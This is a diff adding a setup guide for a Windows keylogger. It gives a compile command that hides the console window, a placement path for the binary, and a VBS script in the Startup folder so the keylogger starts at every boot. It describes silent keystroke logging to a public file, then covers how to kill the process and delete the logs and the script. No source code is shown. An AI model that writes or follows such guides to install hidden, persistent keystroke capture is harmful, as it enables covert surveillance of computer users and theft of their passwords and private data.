@@ -1,0 +1,50 @@
+================================================================
+						KEYLOGGER
+================================================================
+
+================================================================
+[ SETUP ]
+================================================================
+
+1.  COMPILE: 
+    Compile 'keylogger.c' into 'keylogger.exe'.
+    Recommended: gcc keylogger.c -o keylogger.exe -luser32 -mwindows
+
+2.  PAYLOAD PLACEMENT:
+    Move 'keylogger.exe' to:
+    C:\Users\Public\keylogger.exe
+
+3.  PERSISTENCE SETUP:
+    Place 'script.vbs' in the Windows Startup folder:
+    C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+    (Shortcut: Press Win+R, type 'shell:startup')
+
+4.  DATA LOG:
+    Keystrokes will be recorded in:
+    C:\Users\Public\keylogs.txt
+
+⚠️NOTE: The program starts automatically upon system boot. It 
+operates stealthily with no notifications, console windows, 
+or pop-ups.
+
+================================================================
+[ TERMINATION ]
+================================================================
+
+The program runs as a background process. To stop it:
+
+METHOD 1 (Command Line):
+- Open CMD
+- Run: taskkill /F /IM keylogger.exe
+
+METHOD 2 (Task Manager):
+- Press Ctrl + Shift + Esc
+- Go to the 'Processes or Details' tab
+- Search 'keylogger.exe'
+- Right-click and select 'End Task'
+
+⚠️ FORENSIC NOTE: After termination, ensure you delete the 
+keylogs.txt file and remove the .vbs script from the Startup folder 
+to restore the system to its baseline state, also delete the keylogger.c file.
+
+================================================================
